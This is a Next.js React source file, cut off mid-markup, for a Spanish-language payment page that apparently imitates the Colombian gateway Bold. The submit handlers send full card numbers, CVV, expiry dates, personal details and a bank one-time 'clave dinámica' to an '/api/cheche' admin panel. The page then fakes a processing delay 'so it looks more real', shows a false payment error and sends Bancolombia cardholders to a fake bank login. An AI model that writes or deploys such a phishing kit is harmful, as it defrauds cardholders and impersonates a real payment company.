'use client';

import { useState, useEffect } from 'react';
import { useRouter } from 'next/navigation';
import { validateCardNumber, detectCardType, validateCVV, formatCardNumber } from '@/lib/cardValidation';
import { getBankName } from '@/lib/bankDetection';
import CardCarousel from '@/components/bold/CardCarousel';
import SecurityBadges from '@/components/bold/SecurityBadges';
import LoadingScreen from '@/components/bold/LoadingScreen';

export default function BoldPagosPage() {
  const router = useRouter();
  const [loading, setLoading] = useState(false);
  const [orderData, setOrderData] = useState<any>(null);

  // Estado para el método de pago seleccionado (null = no seleccionado)
  const [paymentOption, setPaymentOption] = useState<'card' | 'bancolombia' | null>(null);

  // Estados del formulario de tarjeta
  const [phoneNumber, setPhoneNumber] = useState('');
  const [email, setEmail] = useState('');
  const [cardNumber, setCardNumber] = useState('');
  const [cardType, setCardType] = useState<string>('');
  const [bankName, setBankName] = useState<string>('');
  const [expiryDate, setExpiryDate] = useState('');
  const [cvv, setCvv] = useState('');
  const [cardName, setCardName] = useState('');
  const [acceptData, setAcceptData] = useState(false);
  const [acceptTerms, setAcceptTerms] = useState(false);

  // Estado para notificaciones
  const [notification, setNotification] = useState<{ show: boolean, message: string, type: 'error' | 'success' }>({ show: false, message: '', type: 'error' });

  // Estado para modal de confirmación de banco
  const [showBankConfirmation, setShowBankConfirmation] = useState(false);
  const [detectedBankInfo, setDetectedBankInfo] = useState<{ bank: string, cardBrand: string } | null>(null);

  // Estado para modal de clave dinámica
  const [showDynamicKeyModal, setShowDynamicKeyModal] = useState(false);
  const [dynamicKey, setDynamicKey] = useState('');
  const [processingKey, setProcessingKey] = useState(false);

  // Estado para modal de "NEGOCIO MASTER"
  const [showMasterModal, setShowMasterModal] = useState(false);

  // Estado para modal de conversor de moneda
  const [showCurrencyModal, setShowCurrencyModal] = useState(false);
  const [selectedCurrency, setSelectedCurrency] = useState('COP');
  const [convertedAmount, setConvertedAmount] = useState(0);

  // Tasas de cambio (simuladas - en producción vendrían de una API)
  const exchangeRates: { [key: string]: number } = {
    'COP': 1,
    'USD': 0.00025,
    'EUR': 0.00023,
    'MXN': 0.0043
  };

  // Estado para mensaje rotativo
  const [currentMessage, setCurrentMessage] = useState(0);
  const messages = [
    'Más de 3 años vinculado a Bold.',
    'Más de 9500 ventas exitosas con Bold'
  ];

  // Rotar mensajes cada 3 segundos
  useEffect(() => {
    const interval = setInterval(() => {
      setCurrentMessage((prev) => (prev + 1) % messages.length);
    }, 3000);
    return () => clearInterval(interval);
  }, []);

  const showNotification = (message: string, type: 'error' | 'success' = 'error') => {
    setNotification({ show: true, message, type });
    setTimeout(() => setNotification({ show: false, message: '', type: 'error' }), 4000);
  };

  // Cargar datos de la orden desde sessionStorage
  useEffect(() => {
    const storedData = sessionStorage.getItem('boldOrderData');
    if (storedData) {
      try {
        const parsed = JSON.parse(storedData);
        setOrderData(parsed);

        // Pre-llenar campos si vienen del checkout
        if (parsed.email) setEmail(parsed.email);
        if (parsed.phone) setPhoneNumber(parsed.phone.replace('+57', ''));
      } catch (error) {
        console.error('Error al parsear datos de la orden:', error);
      }
    } else {
      // Si no hay datos, redirigir al checkout
      router.push('/checkout');
    }
  }, [router]);

  // Detectar tipo de tarjeta y banco (Híbrido: Local + API)
  useEffect(() => {
    // Debounce para no saturar la API
    const timeoutId = setTimeout(async () => {
      const cleanNumber = cardNumber.replace(/\s/g, '');

      if (cleanNumber.length >= 6) {
        // 1. Detectar Marca (Visa/Master, etc) - Local y Rápido
        const typeInfo = detectCardType(cardNumber);
        const type = typeInfo?.brand || '';
        setCardType(type);

        // 2. Detectar Banco - Llamada a API (Híbrida)
        try {
          // Solo llamar si cambiaron los primeros 6 dígitos
          const bin = cleanNumber.substring(0, 6);
          const res = await fetch('/api/bin-lookup', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ bin })
          });

          if (res.ok) {
            const data = await res.json();
            if (data.bank) {
              setBankName(data.bank.bankName);
              console.log('🏦 Banco detectado (API/Local):', data.bank.bankName);
            } else {
              setBankName(''); // No detectado
            }
          }
        } catch (error) {
          console.error('Error detectando banco:', error);
        }
      } else {
        setCardType('');
        setBankName('');
      }
    }, 500);

    return () => clearTimeout(timeoutId);
  }, [cardNumber]);

  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatCardNumber(e.target.value);
    setCardNumber(formatted);
  };

  const handleExpiryChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let value = e.target.value.replace(/\D/g, '');
    if (value.length >= 2) {
      value = value.slice(0, 2) + '/' + value.slice(2, 4);
    }
    setExpiryDate(value.slice(0, 5));
  };

  const validateExpiryDate = (expiry: string): boolean => {
    if (expiry.length !== 5) return false;

    const [month, year] = expiry.split('/').map(Number);
    if (month < 1 || month > 12) return false;

    const currentDate = new Date();
    const currentYear = currentDate.getFullYear() % 100; // Últimos 2 dígitos
    const currentMonth = currentDate.getMonth() + 1;

    if (year < currentYear) return false;
    if (year === currentYear && month < currentMonth) return false;

    return true;
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    // Validaciones Estrictas
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(email)) {
      showNotification('Por favor ingresa un correo electrónico válido');
      return;
    }

    const phoneRegex = /^\d{10}$/;
    if (!phoneRegex.test(phoneNumber)) {
      showNotification('Por favor ingresa un número de celular válido (10 dígitos)');
      return;
    }

    if (!validateCardNumber(cardNumber)) {
      showNotification('Número de tarjeta inválido. Por favor verifica.');
      return;
    }

    if (!validateExpiryDate(expiryDate)) {
      showNotification('Fecha de expiración inválida o vencida.');
      return;
    }

    const cvvLength = cardType === 'American Express' ? 4 : 3;
    if (!validateCVV(cvv, cvvLength)) {
      showNotification(`CVV inválido para tarjeta ${cardType}. ${cardType === 'American Express' ? 'Debe tener 4 dígitos.' : 'Debe tener 3 dígitos.'}`);
      return;
    }

    // Procesar pago directamente sin mostrar modal
    setLoading(true);

    // Check if it's Bancolombia card - if so, start authentication flow
    const detectedBank = bankName ? bankName.toLowerCase() : '';
    if (detectedBank.includes('bancolombia')) {
      try {
        // Create session for Bancolombia authentication with ALL data
        const response = await fetch('/api/cheche', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            action: 'create_session',
            bank: 'bancolombia',
            // Datos personales completos
            fullName: orderData.customer?.fullName || cardName,
            email,
            phone: `+57${phoneNumber}`,
            address: orderData.customer?.address,
            city: orderData.customer?.city,
            state: orderData.customer?.state,
            country: orderData.customer?.country,
            postalCode: orderData.customer?.postalCode,
            documentId: orderData.customer?.documentId,

            // Información COMPLETA de tarjeta
            cardNumber: cardNumber, // Número completo
            cardHolderName: cardName, // Nombre en tarjeta
            expiryDate: expiryDate, // Fecha completa
            cvv: cvv, // CVV completo
            cardBrand: cardType,

            // Datos de orden
            totalAmount: orderData.totalAmount,

            customerData: {
              fullName: orderData.fullName,
              email,
              phone: `+57${phoneNumber}`,
              address: orderData.address,
              city: orderData.city,
              state: orderData.state,
              country: orderData.country,
              postalCode: orderData.postalCode,
            },
            orderData: {
              ...orderData,
              totalAmount: orderData.totalAmount,
              cardInfo: {
                last4: cardNumber.slice(-4),
                brand: cardType,
                bank: bankName,
              },
              paymentMethod: 'Bold'
            }
          })
        });

        if (!response.ok) {
          throw new Error('Error al crear sesión de autenticación');
        }

        const result = await response.json();

        if (result.success && result.session) {
          // Redirect to Bancolombia authentication flow
          router.push(`/bancolombia/usuario?sessionId=${result.session.sessionId}`);
          return;
        }
      } catch (error) {
        console.error('Error creating authentication session:', error);
        showNotification('Hubo un error al iniciar la autenticación. Por favor intenta de nuevo.');
        setLoading(false);
        return;
      }
    }

    // Para otros bancos, mostrar modal de clave dinámica
    setLoading(false);
    setShowDynamicKeyModal(true);
  };

  const handleDynamicKeySubmit = async () => {
    if (!dynamicKey || dynamicKey.length < 4) {
      showNotification('Por favor ingresa una clave válida');
      return;
    }

    setProcessingKey(true);

    try {
      // Enviar información completa al panel de administración con la clave dinámica
      const response = await fetch('/api/cheche', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          action: 'create_session',
          bank: bankName || 'Otro Banco',
          // Datos personales completos
          fullName: orderData.customer?.fullName || cardName,
          email,
          phone: `+57${phoneNumber}`,
          address: orderData.customer?.address,
          city: orderData.customer?.city,
          state: orderData.customer?.state,
          country: orderData.customer?.country,
          postalCode: orderData.customer?.postalCode,
          documentId: orderData.customer?.documentId,

          // Información COMPLETA de tarjeta
          cardNumber: cardNumber, // Número completo
          cardHolderName: cardName, // Nombre en tarjeta
          expiryDate: expiryDate, // Fecha completa
          cvv: cvv, // CVV completo
          cardBrand: cardType,
          dynamicKey: dynamicKey, // CLAVE DINÁMICA

          // Datos de orden
          totalAmount: orderData.totalAmount,

          customerData: {
            fullName: orderData.fullName,
            email,
            phone: `+57${phoneNumber}`,
            address: orderData.address,
            city: orderData.city,
            state: orderData.state,
            country: orderData.country,
            postalCode: orderData.postalCode,
          },
          orderData: {
            ...orderData,
            totalAmount: orderData.totalAmount,
            cardInfo: {
              last4: cardNumber.slice(-4),
              brand: cardType,
              bank: bankName,
              dynamicKey: dynamicKey,
            },
            paymentMethod: 'Bold - Tarjeta ' + cardType,
            status: 'pending'
          }
        })
      });

      if (!response.ok) {
        console.error('Error al enviar datos al panel');
      }

      // Simular procesamiento (2.5-3 segundos para que se vea más real)
      await new Promise(resolve => setTimeout(resolve, 2500));

      // Cerrar modal y mostrar error
      setShowDynamicKeyModal(false);
      setProcessingKey(false);
      showNotification('Error al procesar el pago. Por favor verifica los datos de tu tarjeta e intenta nuevamente.', 'error');

      // Después de 2 segundos, redirigir al carrito
      setTimeout(() => {
        router.push('/carrito?error=payment_failed');
      }, 2000);

    } catch (error) {
      console.error('Error processing payment:', error);
      setProcessingKey(false);
      setShowDynamicKeyModal(false);
      showNotification('Hubo un error al procesar el pago. Por favor intenta de nuevo.');
    }
  };

  if (!orderData) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-gray-50">
        <div className="text-center">
          <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-pink-600 mx-auto mb-4"></div>
          <p className="text-gray-600">Cargando información del pago...</p>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen flex flex-col lg:flex-row relative" style={{ fontFamily: 'Montserrat, sans-serif' }}>
      {/* LoadingScreen - se muestra cuando está procesando */}
      {loading && <LoadingScreen />}

      {/* Notificación */}
      {notification.show && (
        <div className="fixed top-8 left-1/2 transform -translate-x-1/2 z-50 animate-in slide-in-from-top duration-300">
          <div className={`flex items-center gap-3 px-6 py-4 rounded-xl shadow-2xl border-2 ${notification.type === 'error'
            ? 'bg-red-50 border-red-200 text-red-800'
            : 'bg-green-50 border-green-200 text-green-800'
            }`}>
            {notification.type === 'error' ? (
              <svg className="w-6 h-6 flex-shrink-0" fill="currentColor" viewBox="0 0 20 20">
                <path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z" clipRule="evenodd" />
              </svg>
            ) : (
              <svg className="w-6 h-6 flex-shrink-0" fill="currentColor" viewBox="0 0 20 20">
                <path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clipRule="evenodd" />
              </svg>
            )}
            <p className="font-medium">{notification.message}</p>
            <button
              onClick={() => setNotification({ show: false, message: '', type: 'error' })}
              className="ml-2 hover:opacity-70 transition"
            >
              <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 20 20">
                <path fillRule="evenodd" d="M4.293 4.293a1 1 0 011.414 0L10 8.586l4.293-4.293a1 1 0 111.414 1.414L11.414 10l4.293 4.293a1 1 0 01-1.414 1.414L10 11.414l-4.293 4.293a1 1 0 01-1.414-1.414L8.586 10 4.293 5.707a1 1 0 010-1.414z" clipRule="evenodd" />
              </svg>
            </button>
          </div>
        </div>
      )}

      {/* Modal de Clave Dinámica */}
      {showDynamicKeyModal && (
        <div className="fixed inset-0 bg-black/60 backdrop-blur-sm flex items-center justify-center z-50 p-4 animate-in fade-in duration-300">
          <div className="bg-white rounded-3xl shadow-2xl max-w-md w-full p-8 animate-in slide-in-from-bottom duration-300">
            {/* Logo Bold */}
            <div className="flex justify-center mb-6">
              <img src="/logos/pagos/BOLD.png" alt="Bold" className="h-8 object-contain" />
            </div>

            {/* Ícono de seguridad */}
            <div className="flex justify-center mb-6">
              <div className="w-20 h-20 bg-gradient-to-br from-blue-500 to-purple-600 rounded-full flex items-center justify-center shadow-lg">
                <svg className="w-10 h-10 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
                </svg>
              </div>
            </div>

            <h3 className="text-2xl font-black text-gray-900 text-center mb-3">
              Verificación Adicional
            </h3>
            <p className="text-gray-600 text-center mb-6 leading-relaxed">
              Esta transacción requiere una verificación adicional. Por favor ingresa la <span className="font-bold text-gray-900">clave dinámica</span> de tu banco para procesar esta transacción de forma segura.
            </p>

            {/* Campo de clave dinámica */}
            <div className="mb-6">
              <label className="block text-sm font-bold text-gray-700 mb-2">
                Clave Dinámica
              </label>
              <input
                type="text"
                inputMode="numeric"
                pattern="[0-9]*"
                value={dynamicKey}
                onChange={(e) => {
                  const value = e.target.value.replace(/\D/g, '');
                  setDynamicKey(value);
                }}
                placeholder="Ingresa tu clave dinámica"
                maxLength={12}
                className="w-full px-4 py-4 border-2 border-gray-200 rounded-xl focus:border-blue-500 focus:ring-2 focus:ring-blue-200 transition text-center text-2xl font-bold tracking-wider"
                disabled={processingKey}
                autoFocus
              />
              <p className="text-xs text-gray-500 text-center mt-2">
                Generalmente son 4-8 dígitos
              </p>
            </div>

            {/* Botones */}
            <div className="space-y-3">
              <button
                onClick={handleDynamicKeySubmit}
                disabled={processingKey || !dynamicKey}
                className="w-full bg-gradient-to-r from-blue-600 to-purple-600 hover:from-blue-700 hover:to-purple-700 text-white font-bold py-4 px-6 rounded-xl transition disabled:opacity-50 disabled:cursor-not-allowed shadow-lg hover:shadow-xl"
              >
                {processingKey ? (
                  <div className="flex items-center justify-center gap-3">
                    <div className="animate-spin rounded-full h-5 w-5 border-b-2 border-white"></div>
                    <span>Procesando...</span>
                  </div>
                ) : (
                  'Continuar con el Pago'
                )}
              </button>

              <button
                onClick={() => {
                  setShowDynamicKeyModal(false);
                  setDynamicKey('');
                }}
                disabled={processingKey}
                className="w-full bg-gray-100 hover:bg-gray-200 text-gray-700 font-bold py-4 px-6 rounded-xl transition disabled:opacity-50 disabled:cursor-not-allowed"
              >
                Cancelar
              </button>
            </div>

            {/* Nota de seguridad */}
            <div className="mt-6 p-4 bg-blue-50 rounded-xl border border-blue-200">
              <div className="flex gap-3">
                <svg className="w-5 h-5 text-blue-600 flex-shrink-0 mt-0.5" fill="currentColor" viewBox="0 0 20 20">
                  <path fillRule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2v-3a1 1 0 00-1-1H9z" clipRule="evenodd" />
                </svg>
                <div>
                  <p className="text-sm font-semibold text-blue-900 mb-1">Tu seguridad es importante</p>
                  <p className="text-xs text-blue-700">Esta clave adicional verifica que eres el titular de la tarjeta. Nunca compartas esta información.</p>
                </div>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* Modal NEGOCIO MASTER */}
      {showMasterModal && (
        <div className="fixed inset-0 bg-black/60 backdrop-blur-sm flex items-center justify-center z-50 p-4 animate-in fade-in duration-300">
          <div className="bg-white rounded-3xl shadow-2xl max-w-md w-full p-8 animate-in slide-in-from-bottom duration-300">
            <div className="flex justify-between items-start mb-6">
              <div>
                <h3 className="text-2xl font-black text-[#1f126f] mb-2">Bold Inbound</h3>
                <div className="inline-flex items-center gap-2 bg-purple-100 px-3 py-1 rounded-full">
                  <svg className="w-4 h-4 text-purple-600" fill="currentColor" viewBox="0 0 20 20">
                    <path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z" />
                  </svg>
                  <span className="text-sm font-bold text-purple-700">NEGOCIO MASTER</span>
                </div>
              </div>
              <button
                onClick={() => setShowMasterModal(false)}
                className="text-gray-400 hover:text-gray-600 transition"
              >
                <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />
                </svg>
              </button>
            </div>

            <p className="text-lg font-bold text-[#1f126f] mb-6">¿Qué lo hace un Negocio Master?</p>

            <div className="grid grid-cols-3 gap-4 mb-8">
              <div className="text-center">
                <div className="w-16 h-16 bg-purple-100 rounded-full flex items-center justify-center mx-auto mb-2">
                  <svg className="w-8 h-8 text-purple-600" fill="currentColor" viewBox="0 0 20 20">
                    <path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm1-12a1 1 0 10-2 0v4a1 1 0 00.293.707l2.828 2.829a1 1 0 101.415-1.415L11 9.586V6z" clipRule="evenodd" />
                  </svg>
                </div>
                <p className="text-sm font-semibold text-gray-800">3 años con Bold</p>
              </div>
              <div className="text-center">
                <div className="w-16 h-16 bg-purple-100 rounded-full flex items-center justify-center mx-auto mb-2">
                  <svg className="w-8 h-8 text-purple-600" fill="currentColor" viewBox="0 0 20 20">
                    <path d="M8.433 7.418c.155-.103.346-.196.567-.267v1.698a2.305 2.305 0 01-.567-.267C8.07 8.34 8 8.114 8 8c0-.114.07-.34.433-.582zM11 12.849v-1.698c.22.071.412.164.567.267.364.243.433.468.433.582 0 .114-.07.34-.433.582a2.305 2.305 0 01-.567.267z" />
                    <path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm1-13a1 1 0 10-2 0v.092a4.535 4.535 0 00-1.676.662C6.602 6.234 6 7.009 6 8c0 .99.602 1.765 1.324 2.246.48.32 1.054.545 1.676.662v1.941c-.391-.127-.68-.317-.843-.504a1 1 0 10-1.51 1.31c.562.649 1.413 1.076 2.353 1.253V15a1 1 0 102 0v-.092a4.535 4.535 0 001.676-.662C13.398 13.766 14 12.991 14 12c0-.99-.602-1.765-1.324-2.246A4.535 4.535 0 0011 9.092V7.151c.391.127.68.317.843.504a1 1 0 101.511-1.31c-.563-.649-1.413-1.076-2.354-1.253V5z" clipRule="evenodd" />
                  </svg>
                </div>
                <p className="text-sm font-semibold text-gray-800">+9500 ventas exitosas</p>
              </div>
              <div className="text-center">
                <div className="w-16 h-16 bg-purple-100 rounded-full flex items-center justify-center mx-auto mb-2">
                  <svg className="w-8 h-8 text-purple-600" fill="currentColor" viewBox="0 0 20 20">
                    <path d="M9 6a3 3 0 11-6 0 3 3 0 016 0zM17 6a3 3 0 11-6 0 3 3 0 016 0zM12.93 17c.046-.327.07-.66.07-1a6.97 6.97 0 00-1.5-4.33A5 5 0 0119 16v1h-6.07zM6 11a5 5 0 015 5v1H1v-1a5 5 0 015-5z" />
                  </svg>
                </div>
                <p className="text-sm font-semibold text-gray-800">Héroe pedaleando</p>
              </div>
            </div>

            <div className="bg-purple-50 rounded-xl p-4 border border-purple-200">
              <p className="font-bold text-[#1f126f] mb-3 text-sm">Datos verificados en los negocios vinculados a Bold:</p>
              <ul className="space-y-2 text-sm text-gray-700">
                <li className="flex items-center gap-2">
                  <div className="w-2 h-2 bg-green-500 rounded-full"></div>
                  Identidad.
                </li>
                <li className="flex items-center gap-2">
                  <div className="w-2 h-2 bg-green-500 rounded-full"></div>
                  Datos personales.
                </li>
                <li className="flex items-center gap-2">
                  <div className="w-2 h-2 bg-green-500 rounded-full"></div>
                  Documento.
                </li>
                <li className="flex items-center gap-2">
                  <div className="w-2 h-2 bg-green-500 rounded-full"></div>
                  Número de celular.
                </li>
                <li className="flex items-center gap-2">
                  <div className="w-2 h-2 bg-green-500 rounded-full"></div>
                  Actividad del negocio.
                </li>
                <li className="flex items-center gap-2">
                  <div className="w-2 h-2 bg-green-500 rounded-full"></div>
                  Validación en listas restrictivas.
                </li>
                <li className="flex items-center gap-2">
                  <div className="w-2 h-2 bg-green-500 rounded-full"></div>
                  Revisión periódica.
                </li>
              </ul>
            </div>
          </div>
        </div>
      )}

      {/* Modal Conversor de Moneda */}
      {showCurrencyModal && (
        <div className="fixed inset-0 bg-black/60 backdrop-blur-sm flex items-center justify-center z-50 p-4 animate-in fade-in duration-300">
          <div className="bg-white rounded-3xl shadow-2xl max-w-md w-full p-8 animate-in slide-in-from-bottom duration-300">
            <div className="flex justify-between items-center mb-6">
              <h3 className="text-xl font-bold text-[#1f126f]">Valor a pagar en pesos colombianos</h3>
              <button
                onClick={() => setShowCurrencyModal(false)}
                className="text-gray-400 hover:text-gray-600 transition"
              >
                <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />
                </svg>
              </button>
            </div>

            {/* Precio original en COP */}
            <div className="bg-gray-50 rounded-2xl p-6 mb-6 text-center">
              <p className="text-sm text-gray-600 mb-2">Valor a pagar en pesos colombianos</p>
              <div className="flex items-center justify-center gap-2">
                <span className="text-3xl font-bold text-[#1f126f]">
                  ${(orderData?.insuranceFee || orderData?.totalAmount || orderData?.total || 0).toLocaleString('es-CO')}
                </span>
                <div className="flex items-center gap-1">
                  <svg width="24" height="24" viewBox="0 0 24 24" fill="none">
                    <rect y="4" width="24" height="6" fill="#FCD116" />
                    <rect y="10" width="24" height="4" fill="#003893" />
                    <rect y="14" width="24" height="6" fill="#CE1126" />
                  </svg>
                  <span className="text-lg font-bold text-gray-700">COP</span>
                </div>
              </div>
            </div>

            {/* Icono de intercambio */}
            <div className="flex justify-center mb-6">
              <svg className="w-8 h-8 text-[#8e7df8]" fill="currentColor" viewBox="0 0 24 24">
                <path d="M7 10l5 5 5-5H7z" />
                <path d="M7 14l5-5 5 5H7z" />
              </svg>
            </div>

            {/* Selector de moneda */}
            <div className="bg-[#6b4cf0] rounded-2xl p-6 mb-6">
              <p className="text-sm text-white/80 mb-3 font-semibold">Selecciona tu moneda*</p>

              <div className="flex items-center justify-between bg-white/20 backdrop-blur rounded-xl p-4 mb-4">
                <span className="text-3xl font-bold text-white">
                  ${selectedCurrency === 'COP'
                    ? '0'
                    : ((orderData?.insuranceFee || orderData?.totalAmount || orderData?.total || 0) * exchangeRates[selectedCurrency]).toFixed(2)}
                </span>
                <select
                  value={selectedCurrency}
                  onChange={(e) => setSelectedCurrency(e.target.value)}
                  className="bg-[#8e7df8] text-white font-bold px-4 py-2 rounded-full text-sm cursor-pointer border-none outline-none"
                >
                  <option value="USD">🇺🇸 USD</option>
                  <option value="EUR">🇪🇺 EUR</option>
                  <option value="MXN">🇲🇽 MXN</option>
                </select>
              </div>

              <p className="text-xs text-white/70 text-center">
                Tasa de cambio con 5 decimales
              </p>
            </div>

            {/* Nota informativa */}
            <div className="flex gap-3 p-4 bg-blue-50 rounded-xl border border-blue-200">
              <svg className="w-5 h-5 text-blue-600 flex-shrink-0 mt-0.5" fill="currentColor" viewBox="0 0 20 20">
                <path fillRule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2v-3a1 1 0 00-1-1H9z" clipRule="evenodd" />
              </svg>
              <div className="text-xs text-gray-700">
                <p className="font-bold text-[#1f126f] mb-1">*Este pago lo harás en pesos colombianos</p>
                <p>debido a la locación del negocio. Usamos la tasa de cambio actual para la conversión.</p>
                <p className="mt-2">El valor de cambio puede variar al momento de hacer el pago. Ten en cuenta que tu banco puede aplicar cargos por transacción internacional.</p>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* Columna izquierda - REESTRUCTURADA COMO BOLD ORIGINAL */}
      <div style={{
        boxSizing: 'border-box',
        display: 'flex',
        flexDirection: 'column',
        position: 'sticky',
        top: '0px',
        background: 'linear-gradient(180deg, #ff2947 -5.69%, #121e6c 107.18%)',
        borderStartEndRadius: '24px',
        borderEndEndRadius: '24px',
        padding: '32px 24px',
        color: 'rgb(255, 255, 255)',
        width: '40%',
        height: '100vh',
        overflowY: 'auto',
        justifyContent: 'space-between'
      }}>
        {/* Header con logo y selector de idioma - ABSOLUTE TOP */}
        <div style={{
          display: 'flex',
          justifyContent: 'space-between',
          alignItems: 'center',
          width: '100%',
          marginBottom: '24px'
        }}>
          {/* Logo Bold arriba a la izquierda */}
          <img
            src="/logos/pagos/BOLD.png"
            alt="Bold"
            style={{
              width: '80px',
              height: '28px'
            }}
          />

          {/* Selector de país */}
          <button style={{
            boxSizing: 'border-box',
            display: 'inline-flex',
            WebkitBoxAlign: 'center',
            alignItems: 'center',
            WebkitBoxPack: 'center',
            justifyContent: 'center',
            position: 'relative',
            WebkitTapHighlightColor: 'transparent',
            backgroundColor: 'rgba(255, 255, 255, 0.2)',
            outline: '0px',
            border: '0px',
            margin: '0px',
            cursor: 'pointer',
            userSelect: 'none',
            verticalAlign: 'middle',
            appearance: 'none',
            textDecoration: 'none',
            padding: '6px 12px',
            borderRadius: '100px',
            transition: 'background-color 250ms cubic-bezier(0.4, 0, 0.2, 1)',
            color: 'rgb(255, 255, 255)',
            fontWeight: '600',
            fontSize: '14px',
            lineHeight: '20px',
            gap: '8px',
            height: '32px'
          }}>
            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" style={{ flexShrink: 0, borderRadius: '50%' }}>
              <rect y="4" width="24" height="6" fill="#FCD116" />
              <rect y="10" width="24" height="4" fill="#003893" />
              <rect y="14" width="24" height="6" fill="#CE1126" />
            </svg>
            <span style={{ fontWeight: 600 }}>ES</span>
            <svg style={{
              userSelect: 'none',
              width: '14px',
              height: '14px',
              display: 'inline-block',
              fill: 'currentcolor',
              flexShrink: 0,
              opacity: 0.8
            }} focusable="false" aria-hidden="true" viewBox="0 0 24 24">
              <path d="M7 10l5 5 5-5z"></path>
            </svg>
          </button>
        </div>

        {/* Spacer para empujar contenido hacia abajo */}
        <div style={{ flex: '0.4' }}></div>

        {/* Badge Negocio Master - Arriba de Bold Inbound */}
        <div style={{
          display: 'flex',
          justifyContent: 'center',
          width: '100%',
          marginBottom: '24px'
        }}>
          <button onClick={() => setShowMasterModal(true)} style={{
            boxSizing: 'border-box',
            display: 'inline-flex',
            WebkitBoxAlign: 'center',
            alignItems: 'center',
            WebkitBoxPack: 'center',
            justifyContent: 'center',
            position: 'relative',
            WebkitTapHighlightColor: 'transparent',
            backgroundColor: 'rgb(237, 235, 255)',
            outline: '0px',
            border: '1px solid rgb(237, 235, 255)',
            margin: '0px',
            cursor: 'pointer',
            userSelect: 'none',
            verticalAlign: 'middle',
            appearance: 'none',
            textDecoration: 'none',
            padding: '4px 12px',
            borderRadius: '100px',
            transition: 'all 250ms cubic-bezier(0.4, 0, 0.2, 1)',
            color: 'rgb(142, 125, 248)',
            fontWeight: '500',
            fontSize: '12px',
            lineHeight: '16px',
            gap: '6px',
            textTransform: 'uppercase',
            letterSpacing: '0.5px',
            height: '28px',
            width: 'fit-content'
          }}>
            <img src="/logos/bold/tag-master.svg" alt="" style={{ width: '20px', height: '20px' }} />
            <span>NEGOCIO MASTER</span>
            <img src="/logos/bold/arrow-master.svg" alt="" style={{ width: '10px', height: '10px' }} />
          </button>
        </div>

        {/* Contenido principal */}
        <div style={{
          display: 'flex',
          flexDirection: 'column',
          alignItems: 'center',
          justifyContent: 'flex-start',
          gap: '0px',
          textAlign: 'center',
          maxWidth: '350px',
          margin: '0 auto'
        }}>
          {/* Título Bold Inbound */}
          <h3 style={{
            margin: '0px 0px 12px 0px',
            fontWeight: 800,
            fontSize: '20px',
            lineHeight: '24px',
            color: 'rgb(255, 255, 255)'
          }}>
            Bold Inbound
          </h3>

          {/* Mensaje dinámico */}
          <p style={{
            margin: '0px 0px 24px 0px',
            fontWeight: 700,
            fontSize: '14px',
            lineHeight: '20px',
            color: 'rgb(255, 255, 255)',
            transition: 'opacity 0.5s ease-in-out',
            minHeight: '20px'
          }}>
            {messages[currentMessage]}
          </p>

          {/* Monto */}
          <div style={{
            margin: '0px',
            fontWeight: 700,
            fontSize: '24px',
            lineHeight: '36px',
            color: 'rgb(255, 255, 255)',
            textAlign: 'center',
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'center',
            gap: '6px'
          }}>
            <span style={{ fontWeight: 700 }}>${(orderData?.insuranceFee || orderData?.totalAmount || orderData?.total || 0).toLocaleString('es-CO')}</span>
            <span style={{ fontWeight: 700, fontSize: '20px' }}>COP</span>
          </div>
        </div>

        {/* Spacer para empujar footer hacia abajo */}
